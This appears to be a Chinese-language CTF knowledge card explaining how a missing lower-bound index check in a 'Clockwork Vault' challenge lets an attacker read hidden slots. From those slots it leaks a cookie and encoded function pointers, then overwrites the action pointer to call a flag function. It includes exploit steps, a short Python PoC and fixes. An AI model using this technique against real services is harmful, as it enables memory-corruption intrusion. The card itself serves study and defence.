---
id: ctf-pwn-negative-index-hidden-slot-encoded-fptr
title: 负数下标越界读取隐藏槽位 + cookie 编码函数指针改写
type: scenario
domain: ctf
path: ctf/pwn
technique: negative-index-hidden-slot-encoded-fptr
aliases:
- 负数下标越界
- index > 7 缺下界
- 隐藏 slot 泄露
- cookie 编码函数指针
- encoded action 改写
- Clockwork Vault
tags:
- pwn
- oob
- negative-index
- function-pointer
- pie-leak
- encoded-pointer
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:47:00+08:00'
  notes: 已对照原文 Clockwork Vault 核对：index>7 缺下界、index+2 偏移、service_cookie=0x3141592653589793^(slots>>12)、slots[0]/[1] 隐藏项、magic 0x43414c4942524154、action=cookie^func、inspect(-2/-1/0) 泄露与远程 0x4013ba/0x4013cf/0x4013e4 间距推算均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

菜单只检查 `index > 7` 而不检查下界时，`index = -2/-1` 会落到数组前面的隐藏槽位；这些槽位保存 `service_cookie` 与“cookie 异或函数地址”的编码指针，读取即可泄露 cookie 和 PIE 地址，再把隐藏槽位的 setting 改成 magic、encoded_action 改成 `cookie ^ open_vault`，运行 service cycle 就会调用隐藏的拿 flag 函数。

## 原理

- **上下界只查一边**：`if (index > 7) reject; slot = &slots[index + 2];` 对负数完全放行；`index=-2` 访问 `slots[0]`，`index=-1` 访问 `slots[1]`，这两个正是程序初始化时写入的隐藏项。
- **cookie 派生自地址**：`service_cookie = 0x3141592653589793 ^ ((uintptr_t)slots >> 12)`，`slots[0].setting = cookie`；隐藏项还保存 `cookie ^ idle_cycle`、`cookie ^ trigger_alarm`，相当于把函数地址用 cookie 编码后放在可读槽位。
- **编码函数指针的检查与调用**：service cycle 只校验 `slots[1].setting == 0x43414c4942524154`（"CALIBRAT"），通过后 `action = slots[1].encoded_action ^ cookie; action();`；攻击者只需满足 magic 并写入 `cookie ^ open_vault`。
- **为什么成立**：泄露和写入都走同一个越界索引；cookie 是同一常量，异或可逆，攻击者不需要知道原始函数指针的存储形式。
- **远程布局差异**：本地符号可直接算 PIE，但远程部署可能偏移不同；示例用相邻小函数间距推算 `open_vault = trigger_alarm + (trigger_alarm - idle_cycle)`，避免硬套本地符号。

## 触发条件

- 菜单/API 用有符号整数做数组下标，只检查上界不检查下界。
- 数组前面存在隐藏/敏感结构（cookie、函数指针、编码指针），且可被同样的越界索引读取/写入。
- 服务周期通过 magic 校验后调用编码函数指针。
- 攻击者能多次交互，先泄露再改写。

## 利用步骤

1. `inspect(-2)` 读取 `slots[0].setting`，得到 `service_cookie`。
2. `inspect(-1)` 读取 `slots[1].encoded_action`，异或 cookie 得到 `idle_cycle` 地址。
3. `inspect(0)` 读取 `slots[2].encoded_action`，异或 cookie 得到 `trigger_alarm` 地址。
4. 按目标布局计算 `open_vault`（本地符号或相邻函数间距）；`pie_base = idle_addr - elf.symbols["idle_cycle"]`。
5. `retune(-1, 0x43414c4942524154, service_cookie ^ open_vault)` 覆盖隐藏槽位的 setting 与 encoded_action。
6. 运行 service cycle，触发 `open_vault` 读取 flag。
7. 若远程偏移不同，先用泄露的相邻函数间距校准，不要直接套本地符号。

## PoC

```python
service_cookie, _ = inspect(-2)
_, encoded_idle = inspect(-1)
_, encoded_trigger = inspect(0)
idle_addr = encoded_idle ^ service_cookie
trigger_addr = encoded_trigger ^ service_cookie
open_vault = trigger_addr + (trigger_addr - idle_addr)   # 远程相邻函数间距
pie_base = idle_addr - elf.symbols["idle_cycle"]
encoded_open = service_cookie ^ open_vault

retune(-1, 0x43414C4942524154, encoded_open)
choose(3)   # run service cycle
```

原文实测：泄露 `service_cookie=0x3141592653589397`、`idle_cycle=0x4013ba`、`trigger_alarm=0x4013cf`，推算 `open_vault=0x4013e4`，改写后 service cycle 输出 flag。

## 变体与关联

- **边界变体**：只查 `> n`、只查 `< 0`、有符号/无符号转换、`index+2` 偏移、数组前后隐藏元数据。
- **指针保护变体**：cookie 异或、地址右移异或、指针加密（PAC/safe-linking 风格）；泄露一处即可推导。
- **触发变体**：magic 校验、函数表索引、回调指针、状态机 action。
- **关联卡片**：[[ctf-pwn-type-confusion-reclassify-adjacent-oob-perform]]（同篇堆类型混淆）、[[ctf-pwn-nginx-module-state-machine-uaf-signed-bytecode-negative-index]]（负索引类缺陷）、[[binary-pwn-signed-index-scale-wrap-adjacent-fd]]（有符号索引缩放）。
- **边界**：若程序对 index 做无符号转换或双边界检查，越界不成立；若 cookie 每次请求随机且不可泄露，编码指针无法改写。

## 检测与防御

- **CTF 验证**：先泄露 cookie 与至少两个函数地址，确认异或关系；改写后用 service cycle 验证调用。
- **代码修复**：下标检查必须同时校验 `index >= 0 && index < n`；对 `index + offset` 做溢出/负数检查。
- **设计防御**：隐藏数据不要放在可越界访问的相邻内存；函数指针使用独立只读表或指针认证；cookie 随机化并限制泄露。
- **检测信号**：菜单请求出现负数索引；读取隐藏槽位后紧跟 magic 写入；service cycle 调用异常函数。
